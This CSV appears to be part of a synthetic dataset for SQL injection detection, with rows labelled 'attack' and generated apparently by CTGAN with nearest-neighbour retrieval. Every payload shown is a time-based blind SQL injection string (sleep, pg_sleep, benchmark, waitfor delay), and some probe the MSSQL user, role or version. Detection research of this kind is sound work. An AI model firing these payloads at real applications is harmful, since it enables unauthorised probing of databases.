id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance
CTGAN_000977,attack,time,a' waitfor delay '0:0:10'--,nearest_attack_euclidean,R000011,6.6534617554127795
CTGAN_000978,attack,time,"1   )    )    or 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #",nearest_attack_euclidean,R000047,9.205300668514262
CTGAN_000979,attack,time,1  )   or sleep  (  __TIME__  )  #,nearest_attack_euclidean,R000008,5.725257704941949
CTGAN_000980,attack,time,"""  )   or pg_sleep  (  __TIME__  )  --",nearest_attack_euclidean,R000017,5.443561625057237
CTGAN_000981,attack,time,"1"" where 7739  =  7739 and sleep  (  5  )  --",nearest_attack_euclidean,R000069,6.866176390151384
CTGAN_000982,attack,time," or benchmark  (  10000000,MD5  (  1   )    )   #",nearest_attack_euclidean,R000039,9.443270833116724
CTGAN_000983,attack,time,1'  )   rlike sleep  (  5  )  #,nearest_attack_euclidean,R000068,7.498142314538955
CTGAN_000984,attack,time,", if not  (  select system_user  )   <> 'sa' waitfor delay '0:0:2' --",nearest_attack_euclidean,R000003,8.654774227171686
CTGAN_000985,attack,time,select pg_sleep  (  5  )   and    (    (   'enpn' like 'enpn,nearest_attack_euclidean,R000057,7.123694719579019
CTGAN_000986,attack,time,a' waitfor delay '0:0:10'--,nearest_attack_euclidean,R000011,6.5665287875459075
CTGAN_000987,attack,time,"1%"" and 2388  =  benchmark  (  5000000,md5  (  0x6d457153   )    )   #",nearest_attack_euclidean,R000064,6.59872856018153
CTGAN_000988,attack,time,"""  )   or benchmark  (  10000000,MD5  (  1   )    )   #",nearest_attack_euclidean,R000035,6.0934246416216205
CTGAN_000989,attack,time,"1%""  )   rlike sleep  (  5  )   and   (  ""%""  =  """,nearest_attack_euclidean,R000077,8.313577230727017
CTGAN_000990,attack,time,1   )    )    as pzoo where 8036  =  8036 or 6793  =    (  select 6793 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000053,6.216380521955987
CTGAN_000991,attack,time,1  )   or sleep  (  __TIME__  )  #,nearest_attack_euclidean,R000008,9.022944760131704
CTGAN_000992,attack,time,", if not  (  select system_user  )   <> 'sa' waitfor delay '0:0:2' --",nearest_attack_euclidean,R000003,6.9919515141100925
CTGAN_000993,attack,time,"1""  )   or 6793  =    (  select 6793 from pg_sleep  (  5   )    )    and   (  ""baia""  =  ""baia",nearest_attack_euclidean,R000046,8.006081952058274
CTGAN_000994,attack,time,"1 or benchmark  (  10000000,MD5  (  1   )    )   #",nearest_attack_euclidean,R000013,6.113004135814508
CTGAN_000995,attack,time," )  ,waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000027,9.569348631935554
CTGAN_000996,attack,time,"1'   )    )    or elt  (  5873  =  5873,sleep  (  5   )    )   #",nearest_attack_euclidean,R000063,5.3180956587376675
CTGAN_000997,attack,time,select pg_sleep  (  5  )   and    (    (   'enpn' like 'enpn,nearest_attack_euclidean,R000057,6.090481446812599
CTGAN_000998,attack,time,",waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000016,8.39911805765198
CTGAN_000999,attack,time,"1   )    )    or 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #",nearest_attack_euclidean,R000047,9.219937233764485
CTGAN_001000,attack,time,1   )    )    as pzoo where 8036  =  8036 or 6793  =    (  select 6793 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000053,6.292483198581882
CTGAN_001001,attack,time,"1   )    )    or benchmark  (  10000000,MD5  (  1   )    )   #",nearest_attack_euclidean,R000036,5.65052492130361
CTGAN_001002,attack,time," or benchmark  (  10000000,MD5  (  1   )    )   #",nearest_attack_euclidean,R000039,5.861170437111196
CTGAN_001003,attack,time,"1' where 5702  =  5702 and elt  (  3114  =  3114,sleep  (  5   )    )   #",nearest_attack_euclidean,R000070,8.121947425972982
CTGAN_001004,attack,time,1   )    )    or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000049,6.887353279704039
CTGAN_001005,attack,time,1   )    )    or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000049,6.643856901388084
CTGAN_001006,attack,time,1   )    )    or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000049,7.605761091233056
CTGAN_001007,attack,time,"1"" where 7739  =  7739 and sleep  (  5  )  --",nearest_attack_euclidean,R000069,7.089561689997248
CTGAN_001008,attack,time," )    )   ,waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000020,6.222881281694304
CTGAN_001009,attack,time,", if is_srvrolemember  (  'sysadmin'  )   > 0 waitfor delay '0:0:2' --",nearest_attack_euclidean,R000014,8.745182961638093
CTGAN_001010,attack,time,"1 or benchmark  (  10000000,MD5  (  1   )    )   #",nearest_attack_euclidean,R000013,6.774058456985284
CTGAN_001011,attack,time,1   )    )    or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000049,6.0227823507872715
CTGAN_001012,attack,time,1   )    )    or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000049,5.928024059741912
CTGAN_001013,attack,time, )    )    or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000010,5.678101031085142
CTGAN_001014,attack,time,"1"" where 7739  =  7739 and sleep  (  5  )  --",nearest_attack_euclidean,R000069,5.660376560260588
CTGAN_001015,attack,time,1   )    )    or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000049,6.054950082002377
CTGAN_001016,attack,time,"1"" where 7739  =  7739 and sleep  (  5  )  --",nearest_attack_euclidean,R000069,7.10516081683104
CTGAN_001017,attack,time,select pg_sleep  (  5  )   and    (    (   'enpn' like 'enpn,nearest_attack_euclidean,R000057,5.726486488912019
CTGAN_001018,attack,time,"select benchmark  (  5000000,md5  (  0x4c4d6142   )    )    and    (    (   6866  =  6866",nearest_attack_euclidean,R000042,9.488781275883946
CTGAN_001019,attack,time,"1%""  )   rlike sleep  (  5  )   and   (  ""%""  =  """,nearest_attack_euclidean,R000077,8.146251749367185
CTGAN_001020,attack,time, )   or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000032,7.3908632654424515
CTGAN_001021,attack,time,1   )    )    as pzoo where 8036  =  8036 or 6793  =    (  select 6793 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000053,6.827501163929446
CTGAN_001022,attack,time,1  )   or sleep  (  __TIME__  )  #,nearest_attack_euclidean,R000008,6.165260881599705
CTGAN_001023,attack,time,1   )    )    or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000049,7.456318722090872
CTGAN_001024,attack,time,select pg_sleep  (  5  )   and    (    (   'enpn' like 'enpn,nearest_attack_euclidean,R000057,7.351795723002474
CTGAN_001025,attack,time,"   )    )    or benchmark  (  10000000,MD5  (  1   )    )   #",nearest_attack_euclidean,R000038,5.364194057641057
CTGAN_001026,attack,time,"""   )    )    or sleep  (  __TIME__  )    =  """,nearest_attack_euclidean,R000028,9.648603534863634
CTGAN_001027,attack,time,or sleep  (  __TIME__  )    =  ',nearest_attack_euclidean,R000019,5.28466825475317
CTGAN_001028,attack,time,"1' where 5702  =  5702 and elt  (  3114  =  3114,sleep  (  5   )    )   #",nearest_attack_euclidean,R000070,6.416811991621149
CTGAN_001029,attack,time,"1""  )   as xioc where 7260  =  7260 or elt  (  5873  =  5873,sleep  (  5   )    )   #",nearest_attack_euclidean,R000075,5.581655823105605
CTGAN_001030,attack,time,"""  )   or benchmark  (  10000000,MD5  (  1   )    )   #",nearest_attack_euclidean,R000035,6.032130297641601
CTGAN_001031,attack,time,select pg_sleep  (  5  )   and    (    (   'enpn' like 'enpn,nearest_attack_euclidean,R000057,6.307210437445178
CTGAN_001032,attack,time,or sleep  (  __TIME__  )  #,nearest_attack_euclidean,R000022,7.279514988531233
CTGAN_001033,attack,time,1  )   and   (  select * from   (  select  (  sleep  (  5   )    )     )  fzno  ) ,nearest_attack_euclidean,R000072,7.268628009902984
CTGAN_001034,attack,time,1'   )    )    rlike sleep  (  5  )   and    (    (   'iwct'  =  'iwct,nearest_attack_euclidean,R000055,7.027968375123919
CTGAN_001035,attack,time,"select benchmark  (  5000000,md5  (  0x4c4d6142   )    )    and    (    (   6866  =  6866",nearest_attack_euclidean,R000042,10.544615168867098
CTGAN_001036,attack,time,1'   )    )    rlike sleep  (  5  )   and    (    (   'iwct'  =  'iwct,nearest_attack_euclidean,R000055,6.774970564913312
CTGAN_001037,attack,time,select pg_sleep  (  5  )   and    (    (   'enpn' like 'enpn,nearest_attack_euclidean,R000057,6.5642172455504575
CTGAN_001038,attack,time,"1 or benchmark  (  10000000,MD5  (  1   )    )   #",nearest_attack_euclidean,R000013,7.536050571258227
CTGAN_001039,attack,time,"1   )    )    or benchmark  (  10000000,MD5  (  1   )    )   #",nearest_attack_euclidean,R000036,3.543817590950488
CTGAN_001040,attack,time,"1' where 5702  =  5702 and elt  (  3114  =  3114,sleep  (  5   )    )   #",nearest_attack_euclidean,R000070,6.8670715255186945
CTGAN_001041,attack,time,"""  )   or benchmark  (  10000000,MD5  (  1   )    )   #",nearest_attack_euclidean,R000035,6.773884087150847
CTGAN_001042,attack,time,"1%""   )    )    and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --",nearest_attack_euclidean,R000050,7.768365245281358
CTGAN_001043,attack,time,"1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #",nearest_attack_euclidean,R000054,8.519614429674224
CTGAN_001044,attack,time,"1"" or elt  (  6272  =  6272,sleep  (  5   )    )   ",nearest_attack_euclidean,R000065,6.671556386405739
CTGAN_001045,attack,time,"1""  )   as xioc where 7260  =  7260 or elt  (  5873  =  5873,sleep  (  5   )    )   #",nearest_attack_euclidean,R000075,7.0339156027551635
CTGAN_001046,attack,time,"1   )    )    or 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #",nearest_attack_euclidean,R000047,6.265733558006362
CTGAN_001047,attack,time,select pg_sleep  (  5  )   and    (    (   'enpn' like 'enpn,nearest_attack_euclidean,R000057,4.891265720209292
CTGAN_001048,attack,time," or benchmark  (  10000000,MD5  (  1   )    )   #",nearest_attack_euclidean,R000039,6.904581246786807
CTGAN_001049,attack,time,1   )    )    or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000049,7.255172684234874
CTGAN_001050,attack,time,1   )    )    or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000049,7.2046818648581805
CTGAN_001051,attack,time,or sleep  (  __TIME__  )    =  ',nearest_attack_euclidean,R000019,7.071977152955965
CTGAN_001052,attack,time,1   )    )    or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000049,6.693121034889592
CTGAN_001053,attack,time,"1' where 5702  =  5702 and elt  (  3114  =  3114,sleep  (  5   )    )   #",nearest_attack_euclidean,R000070,5.600267778842158
CTGAN_001054,attack,time,"1%""  )   or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --",nearest_attack_euclidean,R000071,6.307459210200287
CTGAN_001055,attack,time,"1' where 5702  =  5702 and elt  (  3114  =  3114,sleep  (  5   )    )   #",nearest_attack_euclidean,R000070,5.144170668695643
CTGAN_001056,attack,time,"1""  )   or 6793  =    (  select 6793 from pg_sleep  (  5   )    )    and   (  ""baia""  =  ""baia",nearest_attack_euclidean,R000046,8.154064966753992
CTGAN_001057,attack,time,"""  )   or benchmark  (  10000000,MD5  (  1   )    )   #",nearest_attack_euclidean,R000035,5.045789864417773
CTGAN_001058,attack,time,"1"" where 7739  =  7739 and sleep  (  5  )  --",nearest_attack_euclidean,R000069,6.845037166825913
CTGAN_001059,attack,time,1   )    )    or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000006,7.22109284541635
CTGAN_001060,attack,time,select pg_sleep  (  5  )   and    (    (   'enpn' like 'enpn,nearest_attack_euclidean,R000057,7.545809170635279
CTGAN_001061,attack,time,or sleep  (  __TIME__  )    =  ',nearest_attack_euclidean,R000019,6.94253738347568
CTGAN_001062,attack,time, )    )    or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000010,4.938951188985146
CTGAN_001063,attack,time,"""  )   or benchmark  (  10000000,MD5  (  1   )    )   #",nearest_attack_euclidean,R000035,7.871761625793296
CTGAN_001064,attack,time,""" or pg_sleep  (  __TIME__  )  --",nearest_attack_euclidean,R000001,7.8421766305776375
CTGAN_001065,attack,time,"1%""  )   or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --",nearest_attack_euclidean,R000071,7.412980778050291
CTGAN_001066,attack,time,1 waitfor delay '0:0:10'--,nearest_attack_euclidean,R000021,5.472665190455332
CTGAN_001067,attack,time," or benchmark  (  10000000,MD5  (  1   )    )   #",nearest_attack_euclidean,R000039,5.087561954051009
CTGAN_001068,attack,time,"1   )    )    or 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #",nearest_attack_euclidean,R000047,7.215212398849825
CTGAN_001069,attack,time,"""  )   or benchmark  (  10000000,MD5  (  1   )    )   #",nearest_attack_euclidean,R000035,5.166314316604172
CTGAN_001070,attack,time,"1' where 5702  =  5702 and elt  (  3114  =  3114,sleep  (  5   )    )   #",nearest_attack_euclidean,R000070,10.231134890609757
CTGAN_001071,attack,time, )    )    or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000010,7.3841312352209725
CTGAN_001072,attack,time,1'||  (  select 'wadx' where 4287  =  4287 or sleep  (  5  )  #,nearest_attack_euclidean,R000074,6.592296942527375
CTGAN_001073,attack,time,1  )   or sleep  (  __TIME__  )  #,nearest_attack_euclidean,R000008,5.903646346148799
CTGAN_001074,attack,time,1  )   or sleep  (  __TIME__  )  #,nearest_attack_euclidean,R000008,6.087328343576591
CTGAN_001075,attack,time,1   )    )    or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000006,5.069522125681522
CTGAN_001076,attack,time,"1 or benchmark  (  10000000,MD5  (  1   )    )   #",nearest_attack_euclidean,R000013,7.328258272857987
CTGAN_001077,attack,time," )    )   ,waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000020,5.906627205022849
CTGAN_001078,attack,time,select pg_sleep  (  5  )   and    (    (   'enpn' like 'enpn,nearest_attack_euclidean,R000057,6.328697865077626
CTGAN_001079,attack,time,1   )    )    or sleep  (  __TIME__  )  #,nearest_attack_euclidean,R000033,5.493593384307025
CTGAN_001080,attack,time,1   )    )    or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000049,5.981969534901503
CTGAN_001081,attack,time,"   )    )    or benchmark  (  10000000,MD5  (  1   )    )   #",nearest_attack_euclidean,R000038,6.166104492069324
CTGAN_001082,attack,time,a' waitfor delay '0:0:10'--,nearest_attack_euclidean,R000011,6.853601003923565
CTGAN_001083,attack,time,1   )    )    or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000049,7.823737068296549
CTGAN_001084,attack,time,"1""   )    )    as dnhd where 2657  =  2657 or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --",nearest_attack_euclidean,R000044,8.801043833274143
CTGAN_001085,attack,time,select pg_sleep  (  5  )   and    (    (   'enpn' like 'enpn,nearest_attack_euclidean,R000057,8.253907587523708
CTGAN_001086,attack,time,"1 or benchmark  (  10000000,MD5  (  1   )    )   #",nearest_attack_euclidean,R000013,6.754508822831581
CTGAN_001087,attack,time,"1%""  )   or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --",nearest_attack_euclidean,R000071,7.397129171993502
CTGAN_001088,attack,time,select pg_sleep  (  5  )   and    (    (   'enpn' like 'enpn,nearest_attack_euclidean,R000057,7.748749968033713
CTGAN_001089,attack,time,"; if not  (  substring   (    (   select @@version  )  ,25,1  )   <> 0  )   waitfor delay '0:0:2' --",nearest_attack_euclidean,R000007,8.973290535104892
CTGAN_001090,attack,time,"1' where 5702  =  5702 and elt  (  3114  =  3114,sleep  (  5   )    )   #",nearest_attack_euclidean,R000070,5.608479547867059
CTGAN_001091,attack,time, )   or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000032,5.611686168719714
CTGAN_001092,attack,time,1   )    )    or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000049,6.198714159440242
CTGAN_001093,attack,time,pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000015,6.549070691600207
CTGAN_001094,attack,time,1   )    )    or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000049,6.588919667688229
CTGAN_001095,attack,time,", if not  (  select system_user  )   <> 'sa' waitfor delay '0:0:2' --",nearest_attack_euclidean,R000003,6.682186232090579
CTGAN_001096,attack,time,1   )    )    or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000049,7.906302496789538
CTGAN_001097,attack,time,1  )   and   (  select * from   (  select  (  sleep  (  5   )    )     )  fzno  ) ,nearest_attack_euclidean,R000072,9.601087808717878
CTGAN_001098,attack,time,select pg_sleep  (  5  )   and    (    (   'enpn' like 'enpn,nearest_attack_euclidean,R000057,7.329078642188003
CTGAN_001099,attack,time,"""   )    )    or pg_sleep  (  __TIME__  )  --",nearest_attack_euclidean,R000026,7.062519554460256
CTGAN_001100,attack,time,"""   )    )    or pg_sleep  (  __TIME__  )  --",nearest_attack_euclidean,R000026,6.276804291805375
CTGAN_001101,attack,time,"1   )    )    or 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #",nearest_attack_euclidean,R000047,5.536098266445215
CTGAN_001102,attack,time,1   )    )    or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000049,6.921373674647861
CTGAN_001103,attack,time,"1   )    )    or 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #",nearest_attack_euclidean,R000047,9.093849479080381
CTGAN_001104,attack,time,1  )   or sleep  (  __TIME__  )  #,nearest_attack_euclidean,R000008,5.58193347039881
CTGAN_001105,attack,time,1'   )    )    rlike sleep  (  5  )   and    (    (   'iwct'  =  'iwct,nearest_attack_euclidean,R000055,7.225824456803535
CTGAN_001106,attack,time,"1   )    )    or 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #",nearest_attack_euclidean,R000047,7.36880288188872
CTGAN_001107,attack,time,"1%""  )   or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --",nearest_attack_euclidean,R000071,8.566661958829954
CTGAN_001108,attack,time,1'||  (  select 'wadx' where 4287  =  4287 or sleep  (  5  )  #,nearest_attack_euclidean,R000074,7.74763254634901
CTGAN_001109,attack,time,"1 where 5466  =  5466 and 2388  =  benchmark  (  5000000,md5  (  0x6d457153   )    )   #",nearest_attack_euclidean,R000045,7.830263681452171
CTGAN_001110,attack,time,1  )   and   (  select * from   (  select  (  sleep  (  5   )    )     )  fzno  ) ,nearest_attack_euclidean,R000072,8.467435118550394
CTGAN_001111,attack,time,1 or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000002,6.224479635342986
CTGAN_001112,attack,time,"1   )    )    or 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #",nearest_attack_euclidean,R000047,7.702650433940396
CTGAN_001113,attack,time,1   )    )    or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000049,7.4419085016095226
CTGAN_001114,attack,time,"""  )   or benchmark  (  10000000,MD5  (  1   )    )   #",nearest_attack_euclidean,R000035,7.734531014365775
CTGAN_001115,attack,time,1   )    )    as pzoo where 8036  =  8036 or 6793  =    (  select 6793 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000053,6.310406072510769
CTGAN_001116,attack,time,"1"" where 7739  =  7739 and sleep  (  5  )  --",nearest_attack_euclidean,R000069,5.805591266852027
CTGAN_001117,attack,time,"1   )    )    or 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #",nearest_attack_euclidean,R000047,7.638567000363141
CTGAN_001118,attack,time,"1%""  )   or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --",nearest_attack_euclidean,R000071,6.968929591333475
CTGAN_001119,attack,time,1   )    )    or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000049,7.626504707822564
CTGAN_001120,attack,time,1'   )    )    rlike sleep  (  5  )   and    (    (   'iwct'  =  'iwct,nearest_attack_euclidean,R000055,5.730976828550708
CTGAN_001121,attack,time,", if not   (    (   select serverproperty  (  'isintegratedsecurityonly'   )    )    <> 0  )   waitfor delay '0:0:2' --",nearest_attack_euclidean,R000023,8.729069384332483
CTGAN_001122,attack,time,"select benchmark  (  5000000,md5  (  0x4c4d6142   )    )    and    (    (   6866  =  6866",nearest_attack_euclidean,R000042,7.026418563122576
CTGAN_001123,attack,time,1   )    )    or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000049,8.471481801410707
CTGAN_001124,attack,time,"1   )    )    or benchmark  (  10000000,MD5  (  1   )    )   #",nearest_attack_euclidean,R000036,7.748278011540014
CTGAN_001125,attack,time,a' waitfor delay '0:0:10'--,nearest_attack_euclidean,R000011,7.219619947205121
CTGAN_001126,attack,time,select pg_sleep  (  5  )   and    (    (   'enpn' like 'enpn,nearest_attack_euclidean,R000057,8.983910205276466
CTGAN_001127,attack,time," )    )   ,waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000020,6.382770431438288
CTGAN_001128,attack,time,1 or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000002,5.112138581783372
CTGAN_001129,attack,time,1   )    )    as pzoo where 8036  =  8036 or 6793  =    (  select 6793 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000053,7.411768611881275
CTGAN_001130,attack,time," )    )   ,waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000020,6.133373118864155
CTGAN_001131,attack,time," or benchmark  (  10000000,MD5  (  1   )    )   #",nearest_attack_euclidean,R000039,6.992722989161136
CTGAN_001132,attack,time,"1%""  )   or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --",nearest_attack_euclidean,R000071,7.246980747415973
CTGAN_001133,attack,time,"1   )    )    or 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #",nearest_attack_euclidean,R000047,9.15243667664155
CTGAN_001134,attack,time,"1' where 5702  =  5702 and elt  (  3114  =  3114,sleep  (  5   )    )   #",nearest_attack_euclidean,R000070,5.555382954460338
CTGAN_001135,attack,time,select pg_sleep  (  5  )   and    (    (   'enpn' like 'enpn,nearest_attack_euclidean,R000057,7.140327256834077
CTGAN_001136,attack,time,or sleep  (  __TIME__  )  #,nearest_attack_euclidean,R000022,8.361261001051526
CTGAN_001137,attack,time,1   )    )    as pzoo where 8036  =  8036 or 6793  =    (  select 6793 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000053,7.370937040520277
CTGAN_001138,attack,time,"1'   )    )    or elt  (  5873  =  5873,sleep  (  5   )    )   #",nearest_attack_euclidean,R000063,5.612465438040215
CTGAN_001139,attack,time,"""   )    )    or pg_sleep  (  __TIME__  )  --",nearest_attack_euclidean,R000026,5.96125571301426
CTGAN_001140,attack,time, )    )    or sleep  (  __TIME__  )    =  ',nearest_attack_euclidean,R000031,6.5846897000763684
CTGAN_001141,attack,time,1   )    )    or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000006,6.2317459344945885
CTGAN_001142,attack,time,select pg_sleep  (  5  )   and    (    (   'enpn' like 'enpn,nearest_attack_euclidean,R000057,6.808832221478602
CTGAN_001143,attack,time,"1   )    )    or benchmark  (  10000000,MD5  (  1   )    )   #",nearest_attack_euclidean,R000036,7.134529093834744
CTGAN_001144,attack,time,1   )    )    or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000049,5.73754020644667
CTGAN_001145,attack,time," or benchmark  (  10000000,MD5  (  1   )    )   #",nearest_attack_euclidean,R000039,5.5651144136007495
CTGAN_001146,attack,time,or sleep  (  __TIME__  )    =  ',nearest_attack_euclidean,R000019,5.563808914705947
CTGAN_001147,attack,time,", if not  (  select system_user  )   <> 'sa' waitfor delay '0:0:2' --",nearest_attack_euclidean,R000003,8.371535450679076
CTGAN_001148,attack,time,1   )    )    or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000049,4.328968959905049
CTGAN_001149,attack,time,1   )    )    or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000049,9.089235818716901
CTGAN_001150,attack,time,"1"" where 7739  =  7739 and sleep  (  5  )  --",nearest_attack_euclidean,R000069,6.718620904257255
CTGAN_001151,attack,time,select pg_sleep  (  5  )   and    (    (   'enpn' like 'enpn,nearest_attack_euclidean,R000057,5.204421623957118
CTGAN_001152,attack,time,1'   )    )    rlike sleep  (  5  )   and    (    (   'iwct'  =  'iwct,nearest_attack_euclidean,R000055,6.55736378346909
CTGAN_001153,attack,time,"1""  )   or 6793  =    (  select 6793 from pg_sleep  (  5   )    )    and   (  ""baia""  =  ""baia",nearest_attack_euclidean,R000046,8.000257049111886
CTGAN_001154,attack,time,"1'   )    )    as bedq where 8781  =  8781 or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )   --",nearest_attack_euclidean,R000051,7.8737086849220805
CTGAN_001155,attack,time,1   )    )    or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000049,5.652151391654298
CTGAN_001156,attack,time,or sleep  (  __TIME__  )    =  ',nearest_attack_euclidean,R000019,6.558683124743822
CTGAN_001157,attack,time," )    )   ,waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000020,8.049786580051574
CTGAN_001158,attack,time, )   or sleep  (  __TIME__  )    =  ',nearest_attack_euclidean,R000018,4.690374643698158
CTGAN_001159,attack,time,1   )    )    or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000049,8.251605620331395
CTGAN_001160,attack,time,1'||  (  select 'wadx' where 4287  =  4287 or sleep  (  5  )  #,nearest_attack_euclidean,R000074,6.387494054919605
CTGAN_001161,attack,time,1   )    )    or sleep  (  __TIME__  )  #,nearest_attack_euclidean,R000033,6.246661310500824
CTGAN_001162,attack,time,"   )    )    or benchmark  (  10000000,MD5  (  1   )    )   #",nearest_attack_euclidean,R000038,8.245582172025644
CTGAN_001163,attack,time,1   )    )    as pzoo where 8036  =  8036 or 6793  =    (  select 6793 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000053,6.965342151367146
CTGAN_001164,attack,time,"1 or benchmark  (  10000000,MD5  (  1   )    )   #",nearest_attack_euclidean,R000013,8.52277913054741
CTGAN_001165,attack,time, )    )    or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000010,7.59876687865636
CTGAN_001166,attack,time,"1"" where 7739  =  7739 and sleep  (  5  )  --",nearest_attack_euclidean,R000069,7.717327200582895
CTGAN_001167,attack,time,1  )   and   (  select * from   (  select  (  sleep  (  5   )    )     )  fzno  ) ,nearest_attack_euclidean,R000072,8.421712127330604
CTGAN_001168,attack,time,1'  )   where 7629  =  7629 rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  vwyq  )  #,nearest_attack_euclidean,R000058,7.969382831772402
CTGAN_001169,attack,time,1'||  (  select 'wadx' where 4287  =  4287 or sleep  (  5  )  #,nearest_attack_euclidean,R000074,8.752965772926384
CTGAN_001170,attack,time,"   )    )    or benchmark  (  10000000,MD5  (  1   )    )   #",nearest_attack_euclidean,R000038,6.0709125501569545
